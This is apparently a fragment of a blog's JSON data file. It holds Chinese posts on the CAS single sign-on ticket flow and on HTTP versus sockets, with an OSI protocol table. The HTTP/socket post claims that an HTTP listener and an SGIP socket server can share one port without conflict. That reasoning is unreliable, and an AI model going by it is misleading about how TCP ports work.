1.未登录时\n![cas01](http://67.216.218.49:8000/file/blogs/base/cas/cas01.png)\n如图:<br>\n- (1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。\n- (2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。\n- (3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))\n![cas_session01](http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png)\n将会话的jsessionid设置为图中1.\n- (4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证\n- (5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源\n\n###### 2.已登录时\n当已登录的用户第一次访问其它互相信任的系统时：<br>\n- (1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。\n- (2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。\n- (3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.\n- (4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。\n\n#### 二.登录状态判断\n已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br>\n![cas01](http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png)\n当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br>\n不同的域，各自维护自己的session.<br>\n\n#### 三.退出\n- (1)客户端向当前web应用发起退出请求。\n- (2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。\n- (3)应用返回客户端登出请求。\n- (4)CAS Server 通知所有用户登录访问的应用，用户已登出。\n\n#### 四.CAS中的ticket\n- TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。\n- ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。\n- LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。\n- TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上\n","slug":"base/cas-sso/cas","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ld003w6dcp18d1twq0","content":"<h3 id=\"单点登录\"><a href=\"#单点登录\" class=\"headerlink\" title=\"单点登录\"></a>单点登录</h3><p>单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。</p>\n<h3 id=\"CAS\"><a href=\"#CAS\" class=\"headerlink\" title=\"CAS\"></a>CAS</h3><p>CAS 为 Central Authentication Service。<br><br>CAS 分为 CAS Server 和 CAS Client.<br></p>\n<ul>\n<li>CAS Server 负责用户的认证和授权</li>\n<li>CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。</li>\n</ul>\n<h4 id=\"一-授权与登录操作\"><a href=\"#一-授权与登录操作\" class=\"headerlink\" title=\"一.授权与登录操作\"></a>一.授权与登录操作</h4><h6 id=\"1-未登录时\"><a href=\"#1-未登录时\" class=\"headerlink\" title=\"1.未登录时\"></a>1.未登录时</h6><p><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas01.png\" alt=\"cas01\"><br>如图:<br></p>\n<ul>\n<li>(1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。</li>\n<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。</li>\n<li>(3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))<br><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png\" alt=\"cas_session01\"><br>将会话的jsessionid设置为图中1.</li>\n<li>(4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证</li>\n<li>(5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源</li>\n</ul>\n<h6 id=\"2-已登录时\"><a href=\"#2-已登录时\" class=\"headerlink\" title=\"2.已登录时\"></a>2.已登录时</h6><p>当已登录的用户第一次访问其它互相信任的系统时：<br></p>\n<ul>\n<li>(1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。</li>\n<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。</li>\n<li>(3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.</li>\n<li>(4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。</li>\n</ul>\n<h4 id=\"二-登录状态判断\"><a href=\"#二-登录状态判断\" class=\"headerlink\" title=\"二.登录状态判断\"></a>二.登录状态判断</h4><p>已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br><br><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png\" alt=\"cas01\"><br>当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br><br>不同的域，各自维护自己的session.<br></p>\n<h4 id=\"三-退出\"><a href=\"#三-退出\" class=\"headerlink\" title=\"三.退出\"></a>三.退出</h4><ul>\n<li>(1)客户端向当前web应用发起退出请求。</li>\n<li>(2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。</li>\n<li>(3)应用返回客户端登出请求。</li>\n<li>(4)CAS Server 通知所有用户登录访问的应用，用户已登出。</li>\n</ul>\n<h4 id=\"四-CAS中的ticket\"><a href=\"#四-CAS中的ticket\" class=\"headerlink\" title=\"四.CAS中的ticket\"></a>四.CAS中的ticket</h4><ul>\n<li>TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</li>\n<li>ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</li>\n<li>LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。</li>\n<li>TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"单点登录\"><a href=\"#单点登录\" class=\"headerlink\" title=\"单点登录\"></a>单点登录</h3><p>单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。</p>\n<h3 id=\"CAS\"><a href=\"#CAS\" class=\"headerlink\" title=\"CAS\"></a>CAS</h3><p>CAS 为 Central Authentication Service。<br><br>CAS 分为 CAS Server 和 CAS Client.<br></p>\n<ul>\n<li>CAS Server 负责用户的认证和授权</li>\n<li>CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。</li>\n</ul>\n<h4 id=\"一-授权与登录操作\"><a href=\"#一-授权与登录操作\" class=\"headerlink\" title=\"一.授权与登录操作\"></a>一.授权与登录操作</h4><h6 id=\"1-未登录时\"><a href=\"#1-未登录时\" class=\"headerlink\" title=\"1.未登录时\"></a>1.未登录时</h6><p><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas01.png\" alt=\"cas01\"><br>如图:<br></p>\n<ul>\n<li>(1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。</li>\n<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。</li>\n<li>(3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的TGT与ST,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket(ST))<br><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas_sessionid01.png\" alt=\"cas_session01\"><br>将会话的jsessionid设置为图中1.</li>\n<li>(4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证</li>\n<li>(5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源</li>\n</ul>\n<h6 id=\"2-已登录时\"><a href=\"#2-已登录时\" class=\"headerlink\" title=\"2.已登录时\"></a>2.已登录时</h6><p>当已登录的用户第一次访问其它互相信任的系统时：<br></p>\n<ul>\n<li>(1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。</li>\n<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。</li>\n<li>(3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.</li>\n<li>(4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。</li>\n</ul>\n<h4 id=\"二-登录状态判断\"><a href=\"#二-登录状态判断\" class=\"headerlink\" title=\"二.登录状态判断\"></a>二.登录状态判断</h4><p>已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br><br><img src=\"http://67.216.218.49:8000/file/blogs/base/cas/cas_cookie01.png\" alt=\"cas01\"><br>当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br><br>不同的域，各自维护自己的session.<br></p>\n<h4 id=\"三-退出\"><a href=\"#三-退出\" class=\"headerlink\" title=\"三.退出\"></a>三.退出</h4><ul>\n<li>(1)客户端向当前web应用发起退出请求。</li>\n<li>(2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。</li>\n<li>(3)应用返回客户端登出请求。</li>\n<li>(4)CAS Server 通知所有用户登录访问的应用，用户已登出。</li>\n</ul>\n<h4 id=\"四-CAS中的ticket\"><a href=\"#四-CAS中的ticket\" class=\"headerlink\" title=\"四.CAS中的ticket\"></a>四.CAS中的ticket</h4><ul>\n<li>TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</li>\n<li>ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</li>\n<li>LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。</li>\n<li>TGC:在系统A登录成功后，用户和认证中心之间建立起了全局会话，这个全局会话就是TGT(Ticket Granting Ticket)，TGT位于CAS服务器端，TGT并没有放在Session中，也就是说，CAS全局会话的实现并没有直接使用Session机制，而是利用了Cookie自己实现的，这个Cookie叫做TGC(Ticket Granting Cookie)，它存放了TGT的id(jsessionid),保存在用户浏览器上</li>\n</ul>\n"},{"title":"Http与Socket关系","date":"2018-12-24T15:11:07.000Z","_content":"#### 1.问题\n今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br>\n不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。\n\n#### 2.OSI七层模型\n![OSI](./osi_七层模型.jpg)\n图片来自:https://www.jianshu.com/p/a18a5ba78fad\n\n#### 3.Http与Socket所在层\n\nHttp：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br>\n\nTcp/Udp: 传输层。<br>\n\nIp: 网络层.<br>\n\nSocket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br>\n\nPort: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br>\n\n#### 4.数据的处理流程\n- 1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。\n- 2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。\n- 3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。\n- 4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.\n- 5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。\n\n#### 5.总结\n- 1.Http是应用层协议，Socket是对Tcp/Ip的封装\n- 2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)\n- 3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。\n- 4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。\n\n#### 6.各协议所对应层次 2019/09/23\n\n层级 | 协议\n---- | ----\n应用层 |\tDHCP · DNS · FTP · Gopher · HTTP · IMAP4 · IRC · NNTP · XMPP · POP3 · SIP · SMTP ·SNMP · SSH · TELNET · RPC · RTCP · RTP ·RTSP · SDP · SOAP · GTP · STUN · NTP · SSDP\n表示层|\tHTTP/HTML · FTP · Telnet · ASN.1（具有表示层功能）\n会话层\t|ADSP·ASP·H.245·ISO-SP·iSNS·NetBIOS·PAP·RPC·RTCP·SMPP·SCP·SSH·ZIP·SDP（具有会话层功能）\n传输层|\tTCP · UDP · TLS · DCCP · SCTP ·RSVP · PPTP\n网络层|\tIP (IPv4 · IPv6) · ICMP · ICMPv6 · IGMP ·IS-IS · IPsec · BGP · RIP · OSPF ·ARP · RARP\n数据链路层|\tWi-Fi(IEEE 802.11) · WiMAX(IEEE 802.16) ·ATM · DTM · 令牌环 · 以太网路 ·FDDI · 帧中继 · GPRS · EVDO · HSPA · HDLC · PPP · L2TP · ISDN ·STP\n物理层\t|以太网路卡 · 调制解调器 · 电力线通信(PLC) · SONET/SDH（光同步数字传输网） ·G.709（光传输网络） · 光导纤维 · 同轴电缆 · 双绞线\n\n注意: 应用层，表示层，会话层可以不用那个严格区分，都可以当作应用层协议来看待\n","source":"_posts/base/httpandsocket/http与socket.md","raw":"---\ntitle: Http与Socket关系\ndate: 2018-12-24 10:11:07\ntags: [protocol]\n---\n#### 1.问题\n今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br>\n不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。\n\n#### 2.OSI七层模型\n![OSI](./osi_七层模型.jpg)\n图片来自:https://www.jianshu.com/p/a18a5ba78fad\n\n#### 3.Http与Socket所在层\n\nHttp：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br>\n\nTcp/Udp: 传输层。<br>\n\nIp: 网络层.<br>\n\nSocket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br>\n\nPort: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br>\n\n#### 4.数据的处理流程\n- 1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。\n- 2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。\n- 3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。\n- 4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.\n- 5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。\n\n#### 5.总结\n- 1.Http是应用层协议，Socket是对Tcp/Ip的封装\n- 2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)\n- 3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。\n- 4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。\n\n#### 6.各协议所对应层次 2019/09/23\n\n层级 | 协议\n---- | ----\n应用层 |\tDHCP · DNS · FTP · Gopher · HTTP · IMAP4 · IRC · NNTP · XMPP · POP3 · SIP · SMTP ·SNMP · SSH · TELNET · RPC · RTCP · RTP ·RTSP · SDP · SOAP · GTP · STUN · NTP · SSDP\n表示层|\tHTTP/HTML · FTP · Telnet · ASN.1（具有表示层功能）\n会话层\t|ADSP·ASP·H.245·ISO-SP·iSNS·NetBIOS·PAP·RPC·RTCP·SMPP·SCP·SSH·ZIP·SDP（具有会话层功能）\n传输层|\tTCP · UDP · TLS · DCCP · SCTP ·RSVP · PPTP\n网络层|\tIP (IPv4 · IPv6) · ICMP · ICMPv6 · IGMP ·IS-IS · IPsec · BGP · RIP · OSPF ·ARP · RARP\n数据链路层|\tWi-Fi(IEEE 802.11) · WiMAX(IEEE 802.16) ·ATM · DTM · 令牌环 · 以太网路 ·FDDI · 帧中继 · GPRS · EVDO · HSPA · HDLC · PPP · L2TP · ISDN ·STP\n物理层\t|以太网路卡 · 调制解调器 · 电力线通信(PLC) · SONET/SDH（光同步数字传输网） ·G.709（光传输网络） · 光导纤维 · 同轴电缆 · 双绞线\n\n注意: 应用层，表示层，会话层可以不用那个严格区分，都可以当作应用层协议来看待\n","slug":"base/httpandsocket/http与socket","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lf003y6dcpg0tou3k4","content":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>\n<h4 id=\"2-OSI七层模型\"><a href=\"#2-OSI七层模型\" class=\"headerlink\" title=\"2.OSI七层模型\"></a>2.OSI七层模型</h4><p><img src=\"./osi_七层模型.jpg\" alt=\"OSI\"><br>图片来自:<a href=\"https://www.jianshu.com/p/a18a5ba78fad\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/a18a5ba78fad</a></p>\n<h4 id=\"3-Http与Socket所在层\"><a href=\"#3-Http与Socket所在层\" class=\"headerlink\" title=\"3.Http与Socket所在层\"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>\n<p>Tcp/Udp: 传输层。<br></p>\n<p>Ip: 网络层.<br></p>\n<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>\n<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>\n<h4 id=\"4-数据的处理流程\"><a href=\"#4-数据的处理流程\" class=\"headerlink\" title=\"4.数据的处理流程\"></a>4.数据的处理流程</h4><ul>\n<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>\n<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>\n<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>\n<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>\n<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>\n</ul>\n<h4 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5.总结\"></a>5.总结</h4><ul>\n<li>1.Http是应用层协议，Socket是对Tcp/Ip的封装</li>\n<li>2.Http发送数据也会经过Socket(Tcp或者Udp建立的连接)</li>\n<li>3.数据的传输和接收，是通过Socket,但是得到数据，是按照其包装和解包装的协议来的，Socket只是单纯的传输数据(bit)，并不关心数据是什么，有什么意义。</li>\n<li>4.Socket传输时，发送字符串，接收时也能直接接收到字符串，是因为包装/解包装层级一样，得到了发送时的数据。</li>\n</ul>\n<h4 id=\"6-各协议所对应层次-2019-09-23\"><a href=\"#6-各协议所对应层次-2019-09-23\" class=\"headerlink\" title=\"6.各协议所对应层次 2019/09/23\"></a>6.各协议所对应层次 2019/09/23</h4><table>\n<thead>\n<tr>\n<th>层级</th>\n<th>协议</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>应用层</td>\n<td>DHCP · DNS · FTP · Gopher · HTTP · IMAP4 · IRC · NNTP · XMPP · POP3 · SIP · SMTP ·SNMP · SSH · TELNET · RPC · RTCP · RTP ·RTSP · SDP · SOAP · GTP · STUN · NTP · SSDP</td>\n</tr>\n<tr>\n<td>表示层</td>\n<td>HTTP/HTML · FTP · Telnet · ASN.1（具有表示层功能）</td>\n</tr>\n<tr>\n<td>会话层</td>\n<td>ADSP·ASP·H.245·ISO-SP·iSNS·NetBIOS·PAP·RPC·RTCP·SMPP·SCP·SSH·ZIP·SDP（具有会话层功能）</td>\n</tr>\n<tr>\n<td>传输层</td>\n<td>TCP · UDP · TLS · DCCP · SCTP ·RSVP · PPTP</td>\n</tr>\n<tr>\n<td>网络层</td>\n<td>IP (IPv4 · IPv6) · ICMP · ICMPv6 · IGMP ·IS-IS · IPsec · BGP · RIP · OSPF ·ARP · RARP</td>\n</tr>\n<tr>\n<td>数据链路层</td>\n<td>Wi-Fi(IEEE 802.11) · WiMAX(IEEE 802.16) ·ATM · DTM · 令牌环 · 以太网路 ·FDDI · 帧中继 · GPRS · EVDO · HSPA · HDLC · PPP · L2TP · ISDN ·STP</td>\n</tr>\n<tr>\n<td>物理层</td>\n<td>以太网路卡 · 调制解调器 · 电力线通信(PLC) · SONET/SDH（光同步数字传输网） ·G.709（光传输网络） · 光导纤维 · 同轴电缆 · 双绞线</td>\n</tr>\n</tbody>\n</table>\n<p>注意: 应用层，表示层，会话层可以不用那个严格区分，都可以当作应用层协议来看待</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h4><p>今天发现网关程序中，java监听了8083端口(Http)，同时，又在程序中使用了8083端口作为服务端，接收来自短信网关给我们发送的回执（Sgip1.2)。<br><br>不知道两者之间是否有冲突.了解了http与socket区别后，就知道了。</p>\n<h4 id=\"2-OSI七层模型\"><a href=\"#2-OSI七层模型\" class=\"headerlink\" title=\"2.OSI七层模型\"></a>2.OSI七层模型</h4><p><img src=\"./osi_七层模型.jpg\" alt=\"OSI\"><br>图片来自:<a href=\"https://www.jianshu.com/p/a18a5ba78fad\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/a18a5ba78fad</a></p>\n<h4 id=\"3-Http与Socket所在层\"><a href=\"#3-Http与Socket所在层\" class=\"headerlink\" title=\"3.Http与Socket所在层\"></a>3.Http与Socket所在层</h4><p>Http：Http是应用层的一种协议，用来对Http协议的数据进行读取。<br></p>\n<p>Tcp/Udp: 传输层。<br></p>\n<p>Ip: 网络层.<br></p>\n<p>Socket: Socket是对 TCP/IP 协议的封装，Socket 只是个接口不是协议，通过 Socket 我们才能使用 TCP/IP 协议，除了 TCP，也可以使用 UDP 协议来传递数据。<br></p>\n<p>Port: 端口是Tcp/Udp建立连接所用，也是在传输层，表现为Socket监听Port。<br></p>\n<h4 id=\"4-数据的处理流程\"><a href=\"#4-数据的处理流程\" class=\"headerlink\" title=\"4.数据的处理流程\"></a>4.数据的处理流程</h4><ul>\n<li>1.ClientA向服务端发一个数据，先根据所在层次，层层向下，按照所在层次的协议对数据进行包装。</li>\n<li>2.数据到达服务端后，从底层(物理层)开始，将数据按照对应层协议，进行处理，然后传到上一层，直到得到可用数据。</li>\n<li>3.http协议的数据，从客户端应用层，到达服务端应用层，一次传输完成。</li>\n<li>4.Sgip的数据，在ClientA时，先将数据按照Sgip协议进行包装，在传输层通过Socket发送(依然往下包装到达物理层，Sgip数据包),服务端接收到时，层层解包装，在传输层，Socket接收到数据包后，此时包装层已经只剩下了Sgip包装，因此，在这里按照Sgip协议解包装后，就已经得到了想要的数据。不需要再往上层传递.</li>\n<li>5.因此，在这里，虽然Http与Sgip都使用的统一端口，但是互不影响。</li>\n</ul>\n<h4 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" 